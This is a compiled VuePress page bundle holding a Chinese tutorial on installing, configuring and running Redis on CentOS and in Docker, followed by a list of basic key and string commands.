{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{333:function(s,a,t){\"use strict\";t.r(a);var e=t(33),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[t(\"h2\",{attrs:{id:\"介绍\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#介绍\"}},[s._v(\"#\")]),s._v(\" 介绍\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"redis\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis\"}},[s._v(\"#\")]),s._v(\" Redis\")]),s._v(\" \"),t(\"h2\",{attrs:{id:\"环境安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#环境安装\"}},[s._v(\"#\")]),s._v(\" 环境安装\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"centos-epel-仓库安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#centos-epel-仓库安装\"}},[s._v(\"#\")]),s._v(\" Centos EPEL 仓库安装\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"安装 redis\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"yum \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" epel-release\\nyum update\\nyum \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" redis\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"启动\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"systemctl start redis\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"源码安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#源码安装\"}},[s._v(\"#\")]),s._v(\" 源码安装\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"安装基础依赖\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"yum \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" gcc\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"下载安装包\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"wget\")]),s._v(\" http://download.redis.io/releases/redis-5.0.7.tar.gz\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"解压到指定目录\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"tar xzf redis-5.0.7.tar.gz\\nmv ./redis-5.0.7 /usr/local/redis\\ncd /usr/local/redis/\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"编译\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"make\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"出现报错 zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"make\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[s._v(\"MALLOC\")]),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),s._v(\"libc\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"make[1]: *** [server.o] Error 1\")]),s._v(\" \"),t(\"p\",[s._v(\"make[1]: Leaving directory `/usr/local/redis/src'\")]),s._v(\" \"),t(\"p\",[s._v(\"make: _** [all] Error 2\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看gcc版本是否在5.3以上，centos7.6默认安装4.8.5\")]),s._v(\"\\ngcc -v\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 升级gcc到5.3及以上\")]),s._v(\"\\nyum -y \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" centos-release-scl\\nyum -y \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils\\nscl \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"enable\")]),s._v(\" devtoolset-9 \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"bash\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#需要注意的是scl命令启用只是临时的，退出shell或重启就会恢复原系统gcc版本。\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#如果要长期使用gcc 9.3的话\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"source /opt/rh/devtoolset-9/enable\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">>\")]),s._v(\"/etc/profile\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#这样退出shell重新打开就是新版的gcc了\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#以下其他版本同理，修改devtoolset版本号即可\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"安装\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"make\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"安装完成\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /usr/local/bin/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ls\")]),s._v(\" -all\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"配置⽂件，移动到/etc/⽬录下\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"mkdir /etc/redis\\ncp /usr/local/redis/redis.conf /etc/redis/\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"redis-配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-配置\"}},[s._v(\"#\")]),s._v(\" Redis 配置\")]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"vim /etc/redis/redis.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"允许远程访问\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"bind 127.0.0.1\\n修改为\\n#bind 127.0.0.1\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"关闭保护功能\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"# protected-mode yes\\n修改为\\nprotected-mode no\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"设置密码\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"# requirepass foobared\\n修改为\\nrequirepass password(需要设置的密码)\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"进程在后台运行\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"daemonize no\\n修改为\\ndaemonize yes\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"日志输出文件等信息\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v('logfile \"\"\\n修改为指定的日志文件\\nlogfile \"/var/log/redis/6379.log\"\\n\\n#创建目录\\nmkdir /var/log/redis\\n')])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"开放端口\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"firewall-cmd --add-port=6379/tcp --permanent\\n#重新加载防火墙设置\\nfirewall-cmd --reload\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"redis-开机启动\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-开机启动\"}},[s._v(\"#\")]),s._v(\" Redis 开机启动\")]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"cat > /usr/lib/systemd/system/redis.service <<-EOF\\n[Unit]\\nDescription=Redis persistent key-value database\\nAfter=network.target\\nAfter=network-online.target\\nWants=network-online.target\\n\\n[Service]\\nExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf --supervised systemd\\nExecStop=/usr/local/bin/redis-cli shutdown\\nType=notify\\nUser=root\\nGroup=root\\n\\n[Install]\\nWantedBy=multi-user.target\\nEOF\\n# 使服务自动运行\\nsystemctl daemon-reload\\nsystemctl enable redis\\n# 启动服务\\nsystemctl restart redis\\nsystemctl status redis\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"docker-安装-redis\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#docker-安装-redis\"}},[s._v(\"#\")]),s._v(\" Docker 安装 Redis\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"拉取镜像\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#拉取镜像\"}},[s._v(\"#\")]),s._v(\" 拉取镜像\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#docker pull redis:latest\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#docker pull redis:alpine\")]),s._v(\"\\ndocker pull redis:3.2\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"运行-redis\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#运行-redis\"}},[s._v(\"#\")]),s._v(\" 运行 Redis\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#mkdir -p /home/data/redis\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mkdir\")]),s._v(\" -p /home/docker/redis/\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"conf,data\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /home/docker/redis\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#https://redis.io/topics/config\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"wget\")]),s._v(\" https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf -O conf/redis.conf\\n\\ndocker run -d --privileged\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),s._v(\"true --restart\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),s._v(\"always -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\":6379 -v \"),t(\"span\",{pre:!0,attrs:{class:\"token environment constant\"}},[s._v(\"$PWD\")]),s._v(\"/conf/redis.conf:/etc/redis/redis.conf -v \"),t(\"span\",{pre:!0,attrs:{class:\"token environment constant\"}},[s._v(\"$PWD\")]),s._v(\"/data:/data --name redis redis:3.2 redis-server /etc/redis/redis.conf --appendonly \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"使用\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#使用\"}},[s._v(\"#\")]),s._v(\" 使用\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"通用命令\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#通用命令\"}},[s._v(\"#\")]),s._v(\" 通用命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#遍历所有key\")]),s._v(\"\\nkeys *\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#计算key的总数\")]),s._v(\"\\ndbsize\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#检查key是否存在\")]),s._v(\"\\nexists key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除指定key-value\")]),s._v(\"\\ndel key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置key在seconds秒后过期\")]),s._v(\"\\nexpire key seconds\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#查看key剩余的过期时间\")]),s._v(\"\\nttl key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#去掉key的过期时间\")]),s._v(\"\\npersist key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回key的类型\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"type\")]),s._v(\" key\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"字符串\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#字符串\"}},[s._v(\"#\")]),s._v(\" 字符串\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取key对应的value\")]),s._v(\"\\nget key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置key-value\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" key value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除key-value\")]),s._v(\"\\ndel key\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key自增1，如果key不存在，自增后get(key)=1\")]),s._v(\"\\nincr key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key自减1，如果key不存在，自减后get(key)=-1\")]),s._v(\"\\ndecr key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key自增k，如果key不存在，自增后get(key)=k\")]),s._v(\"\\nincrby key k\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key自减k，如果key不存在，自减后get(key)=-k\")]),s._v(\"\\ndecrby key k\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#不管key是否存在，都设置\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" key value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key不存在，才设置\")]),s._v(\"\\nsetnx key value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#key存在，才设置\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" key value xx\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"##批量获取key\")]),s._v(\"\\nmegt key1 key2 key3\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#批量设置key-value\")]),s._v(\"\\nmset key1 value1 key2 value2 key3 value3\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#set key newvalue并返回旧的value\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" key newvalue\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#将value追加到旧的value\")]),s._v(\"\\nappend key value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回字符串的长度（注意中文）\")]),s._v(\"\\nstrlen key\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#增加key对应的值\")]),s._v(\"\\nincrbyfloat key value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取字符串指定下标所有的值\")]),s._v(\"\\ngetrange key start end\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置指定下标所有对应的值\")]),s._v(\"\\nsetrange key index value\\n\")])]),s._v(\" 